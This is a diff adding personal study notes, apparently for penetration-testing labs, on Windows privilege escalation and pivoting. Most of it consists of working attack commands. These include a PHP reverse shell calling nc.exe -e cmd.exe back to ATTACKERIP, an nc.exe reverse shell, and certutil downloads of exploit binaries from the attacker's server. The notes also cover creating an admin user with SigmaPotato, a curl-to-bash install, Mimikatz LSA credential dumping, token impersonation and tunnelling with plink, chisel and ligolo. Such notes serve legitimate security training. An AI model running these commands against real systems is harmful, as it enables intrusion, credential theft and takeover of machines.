@@ -1,0 +1,457 @@
+https://www.youtube.com/watch?v=uTcrbNBcoxQ
+
+1. Resources
+
+	(to get actual links later)
+	fuzzysecurity - windows security fundamentals
+	swisskyrepo - windows privilege escalation
+	absolomb security guide
+	sushant747 gitbooks.io privilege_escalation_windows
+	potatoattacks - foxglove security - wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+
+2. Gaining a foothold
+
+	a. check for ftp ports, logins, anonymous login
+	b. check for webservers etc
+	c. check if you can upload files and access from the URL,
+	eg file: test.txt
+	URL: 192.168.50.141/test.txt
+
+	d. if possible to upload files, then you can actually go and upload payloads.
+	eg IIS servers -- aspx
+
+3. Initial Enumeration
+
+	3i) System Enumeration
+	a. get the system information first like architecture,
+	OS name, OS Version, System Type
+	command: sysinfo
+
+	b. wmic qfe (check the windows patches & hotfixes - some may be available, some may not)
+	wmic qfe Caption,Description,HotFixID,InstalledOn
+
+	c. Get disk types and how many drives
+	wmic logicaldisk get caption,description,providername
+	
+	3ii) User Enumeration
+	a. get who is the user.
+	command: whoami
+	get your list of prvileges
+	command: whoami /priv
+	get your group list
+	command: whoami /groups
+	get list of users accounts. Does not refer to service accounts
+	command: net user
+	
+	check administrator group users
+	command: net localgroup administrator
+
+	3iii) Network Enumeration
+	
+	a. ipconfig /all
+	Get all information about the current networks
+		
+	b. arp -a
+	Get the list of connected machines
+	
+	c. route
+	Get the routes connected in the network
+	
+	d. netstat -ano
+	find out all the ports that are connected to the current device
+
+
+	3iv.) Password Hunting
+	
+	a. findstr /si password *.txt
+	find the word passwords in .txt files
+
+	findstr /si password *.txt *.ini *.config
+	find even more of the word passwords in .txt, .ini, ,config as well
+
+	3v.) AV & FW enumeration
+
+	a. sc query windefend
+	cmd command to see state of windows defender
+
+	b. sc queryex type= service
+	cmd command to see all services on the machine to see if any other anti-virus software like Sophos, Norton, Symmantec
+
+	c. try either below commands to get firewall details 
+	netsh advfirewall firewall dump
+	netsh firewall show state
+
+	netsh firewall show config
+	- shows config, ports that are blocked.
+	
+
+4. Automated Tools
+
+	i.) Executables
+
+	Winpeas.exe --> more recommended --> https://github.com/peass-ng/PEASS-ng/releases/tag/20240915-f58aa30b
+	seatbelt.exe (compile using VisualStudio)
+	Watson.exe (compile using VisualStudio)
+	sharpup.exe (compile using VisualStudio)
+	
+	ii.) PowerShell
+	
+	Sherlock.ps1
+	PowerUp.ps1
+	jaws-Enum.ps1
+
+	iii.) Other
+
+	windows-exploit-suggester.py (local)
+	Exploit Suggester (Metasploit)
+	
+	a. WinPEAS
+	either run the .exe or .bat
+	WinPEAS.bat is a batch script if you are unable to run the .exe
+	
+	b. Sherlock.ps1
+	Powershell script to quickly find missing software patches for local privilege escalation vulnerabilities.
+
+	c. Windows-Exploit-Suggester.py
+	a. use the systeminfo and put into a .txt file.
+	b. in kali run the command: ./windows-exploit-suggester.py --update
+	c. install python-xlrd / pip install xlrd --upgrade
+	d. then run the windows-exploit-suggester.py on the .txt file in kali
+	./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo theTXTfile.txt
+
+	d. Powerup.ps1
+	use this find find like unquoted service path / services that you can hijack
+
+	e. find unquoted service path:
+	cmd: wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+	powershell (manually find services and check): Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+
+	f. scheduled tasks:
+	Find permissions where you can hijack like not in any system folder, inside user folder: schtasks /query /fo LIST /v | Select-String "C:\\Users"
+
+	g. SigmaPotato
+	run command:
+	whoami /priv
+	(make sure SeImpersonatePrivilege) is set as Enabled
+	.\SigmaPotato "net user dave4 lab /add"
+	download SigmaPotato to the host
+	.\SigmaPotato "net localgroup Administrators dave4 /add"
+
+	h. with SEBACKUPprivileges
+	https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/
+
+5. Kernel Exploits
+	Github.com/secwiki/windows-kernel-exploits
+	
+	a. Metasploit
+		1. in a meterpreter, bg session
+		2. run post/multi/recon/local_exploit_suggester
+		3. use exploit/etc/etc
+		4. options - set rhosts etc
+		5. set sessions 1
+		6. run
+		7. getuid / whoami / getpwd
+		
+		
+	b. Manual Method
+		1. run windows-exploit-suggester.py
+		2. from the bottom up till top, try to use the most below.
+		3. download the exploit from github and upload to your attacker
+		4. run a python host
+		5. from victim shell, run the following command in cmd to download the exe.
+			certutil -urlcache -f https://IPADDRESS:8000/ms10-059.exe ms.exe
+
+6. Passwords & Port Forwarding
+	
+	a. Passwords
+		1. Gain a foothold first - low level enumeration
+		2. check list of all listening ports
+		run netstat -ano
+		3. check list of ip address in network
+		run arp -a
+		4. refer sushant747 guide:
+			i.) look for passwords strings maybe? -- this will take a long time - use later
+			ii.) use registry to do quicksearch for password
+				eg in cmd.
+				reg query "HKLM /f password /t REG_SZ /s
+				
+				use registry to find any logon passwords
+				reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
+				
+				
+	b. Port Forwarding (Plink)
+		1. On Windows:
+			google plink.exe putty download
+			find plink.exe
+			
+		2. Get Plink.exe
+			i. Start http server and host the plink.exe
+			ii. In the victim shell, download plink.exe
+			certutil -urlcache -f http://IPADDRESS:8000/plink.exe
+		
+		3. SSH (Make sure Kali has ssh installed)
+			i. gedit /etc/ssh/sshd_config
+			ii. Look for #permitrootlogin
+			uncomment it. Then put it like below:
+			PermitRootLogin yes
+			iii. service ssh restart
+			iv. service ssh start
+		
+		4. Back to victim shell:
+			run the following command:
+				plink.exe -l kali -pw kali -R 445:127.0.0.1:445 10.10.14.5
+			Meaning port 445 on the victim machine will open up will now connect to port 445 on Kali machine
+			10.10.14.5 - kali / attacker machine IP
+			username: kali
+			password: kali
+			-R refers to port forward
+			
+			you will now be inside the Kali Terminal from the victim machine.
+			
+
+		5. in Kali, use winexe - executes linux commands on windows system.
+		command: winexe -U Adminstrator%Welcome1! //127.0.0.1 "cmd.exe"
+		change password (Welcome1!) as necessary
+		may have to keep trying to get a system32 shell
+
+
+	c. Port Forwarding (Chisel)
+	
+		====Section A - Scanning for networks from the Pivot Machine====
+		1. SSH to a pivot machine
+		2. Conduct a scan on the network, run the command below:
+			for i in $(seq 254); do ping 10.1.2.${i} -c1 -W1 & done | grep from #replace 10.1.2. with the actual network
+		
+		3. In Kali, download static-binaries from Andrew-database
+		depend if its windows or Linux Environment, download accordingly - nmapFILE
+		
+		4. From Kali, 
+			scp nmapFILE user@10.1.1.10:/tmp
+			
+		5. From the pivot machine
+			cd tmp
+			./nmapFILE 10.1.2.5
+			./nmapFILE 10.1.2.6
+			
+		====Section B - Chisel====
+		
+		1. Install chisel in kali
+		https://github.com/jpillora/chisel
+		curl https://i.jpillora.com/chisel! | bash
+		
+		2. copy chisel to the tmp directory at the pivot machine
+		scp chisel user@10.1.1.10:/tmp
+		
+		3. In kali run like this:
+		chisel server --socks5 --reverse
+		
+		Then, get the fingerprint like: hlvnjToetcetcroQ=
+		
+		4. In the SSH pivot machine, run the following command:
+		
+		For basic forwarding:
+		./chisel client --fingerprint hlvnjToetcetcroQ= OriginalIPKALI:8080 R:8000:10.1.2.5:80
+		
+		For Port Forwarding of Reverse Shell etc Port 9999 of ssh machine will now connect to Attacker IP of port 9999
+		./chisel client --fingerprint hlvnjToetcetcroQ= OriginalIPKALI:8080 0.0.0.0:9999:OriginalIPKALI:9999
+		
+		5. In Kali, go to web-browser, type in the address: localhost:8000, you will be able to access the server of 10.1.2.5:80
+		
+		6. If you need all services, you can do this in SSH Pivot Machine
+		./chisel client --fingerprint hlvnjToetcetcroQ= OriginalIPKALI:8080 R:socks
+		
+		
+		however you need proxychains.
+		Back in Kali on the chisel server --socks5 --reverse:
+		check the proxy#R - should be like below:
+		proxy #R:127.0.0.1:1080=>socks.
+		the 1080 should be the port that is bind to the proxy socks.
+		
+		7. open another kali terminal.
+		Run the following command:
+			i.) sudo subl /etc/proxychains4.conf
+			ii.) Look for socks5 whatever at the bottom
+			iii.) edit it like below: 
+			socks5 127.0.0.1 1080 
+			
+			iv.) now all command, you can use : 
+			proxychains curl http://10.1.2.5
+		
+		
+		8. From browser, you can download foxyproxy addon
+		set the following settings:
+		
+		proxyType: SOCKS5
+		Proxy IP Address: 127.0.0.1
+		Port: 1080
+			
+		Set the addon to be used. click on the addon and enable it.
+
+	d. Port Forwarding (Ligolo)
+		https://github.com/nicocha30/ligolo-ng >> go to releases page
+		
+		1. download Proxy file for Kali (Attacker)
+		2. download Agent file for Windows (Pivot) agent.exe
+		
+		========= After Downloading =========
+		
+		3. setup a python http server on Kali
+		4. Download the Agent File onto Windows from the python http server
+		
+		========= Setup =========
+		Always Start from this First: (Number 5)
+		5. On Kali Run the command below:
+			sudo ip tuntap add user kali mode tun ligolo
+			sudo ip link set ligolo up
+		
+			cd ligolo-proxy-linux
+			./proxy -h (For help of ligolo)
+		
+		To run the Ligolo Proxy
+			./proxy -selfcert 
+		
+		6. On Windows - execute ligolo
+		run the following:
+			ligolo-agent.exe -connect KALIIP_Address:11601 -ignore-cert
+			
+		7. back on Kali, in Ligolo, you can run help to get list of help.
+		session -> show sessions - enter the number, to get the session
+		
+		========= Pivoting =========
+		
+		8. Back on Kali Normal Terminal: Add the Pivot to Kali
+			sudo ip route add 10.10.120.0/24 dev ligolo (where the ip range is the list of IP)
+		
+		   show the list of IP route after adding in kali.
+			ip route list
+			
+		9. Back on the Ligolo proxy sessions in Kali:
+			start
+			****You should see a tunnel session in Kali
+			
+		10. You should be able to run kali command on the 10.10.120.0/24 network already.
+		
+		========= Catching Reverse Shells =========
+	
+		11. In Kali, in the same listerner session, run the following:
+		listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444  (any connection to the pivot, port 1234 will be forwarded to kali port 4444)
+		
+		listener_list (to see the listerners)
+		
+		12. Lets say we got a shell in some faraway machines and we want to to run netcat, we need to run like: this reverse shell is actually to the listerner which is then forwarded to Kali
+		nc.exe 10.10.120.131 1234 -e cmd 
+		
+		========= Uploading Files =========
+
+		13. In Kali, in the same listerner session, run the following:
+		
+		listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80 (use port 80 / 8000 depend on what port of the python webserver)
+		listener_list (to see the listerners)
+		
+		14. In remote machine:
+		certutil -urlcache -f http://10.10.120.131:1235/file.txt file.txt (using the ip address of the pivot machine)
+		
+		
+		
+		
+		
+		
+7. Windows Subsystem for Linux
+
+	a. Initial access
+	Get a shell first, assuming you have credentials:
+	i.) using impacket psexec
+	ii.) If SMB server is open, IIS is up, you can try uploading nc.exe
+		locate nc.exe --> /usr/share/windows-resources/binaries/nc.exe nc.exe
+		put nc.exe in the smbclient
+		Create a malicious PHP file --> rev.php
+			<?php
+			system('nc.exe -e cmd.exe ATTACKERIP PORT')
+			?>
+		put the PHP file in smbclient
+		In Attacker, set up listener
+		Access the URL/rev.php
+		You will get a shell.
+	iii.) With access, you can run systeminfo to see if you can get systeminfo
+		check for windefender
+		sc query windefend
+	
+	b.) Find Windows Subsystem for Linux
+	where /R c:\windows bash.exe
+	
+	where /R c:\windows wsl.exe
+
+	i.) run the wsl.exe with whoami
+	filepath\wsl.exe whoami
+	
+	ii.) run the bash.exe
+	filepath\bash.exe
+	
+	get a bin/bash shell:
+	python -c import "import pty;pty.spawn('/bin/bash')
+	
+	type history
+	to see if any administrator password is available.
+
+	c.) After getting administrator password, from attacker machine
+	to get a shell:
+	i.) impacket-psexec administrator:'PASSWORD'@IPADDRESS
+	ii.) impacket-smbexec administrator:'PASSWORD'@IPADDRESS
+	--semi interactive shell
+	(But this one is semi interactive. Better to put in one more NC to get a full reverse shell)
+			
+8. Get Token Overview
+
+	a. Mimikatz - dump LSA Credentials
+	From PowerShell:
+	Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /patch" exit' -Computer DESKTOP1111
+
+	Mimikatz - dump LSA - dump kerberos hash
+	LSADump::LSA /patch
+	
+	b. Meterpreter - impersonate_token
+	command: impersonate_token Domain\\Administrator
+
+	c. Meterpreter - getprivs - shows the privilleges available on the current computer
+		(more info: swisskyrepo -  windows privilege escalation - windows subsystem for linux wsl)
+	command: getprives 
+	
+	d. Potato Attacks
+		Trick the NT AUTHORITY\SYSTEM account into authenticating via NTLM to a TCP Endpoint
+		Man in the middle this authentication attempt to locally negotiate a security token for the NT Authority\System account through a series of API calls
+		Impersonate the token we just used. This can only be done using service accounts.
+	
+	usually use msfconsole.
+		commands:
+		i.) load incognito
+		ii.) list_tokens -u
+		iii.) impersonate_token "NT AUTHORITY\SYSTEM"
+		iv.) shell
+		v.) whoami
+
+
+
+9. GetSystem:
+	In Meterprer
+	run the command: getsystem
+	(this must be careful since it could crash the machine)
+
+
+		
+10. RunAS
+
+	i.) From a CMD
+	
+	Get list of stored credentials:
+	cmdkey /list
+	
+	Assuming output shows like user: ACCESS\Administrator
+
+	you can run like the following command:
+	C:\Windows\Systems32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\users\security\root.txt"
+
+	
+
+
+11. Others:
+	DIR list deeper: dir /R
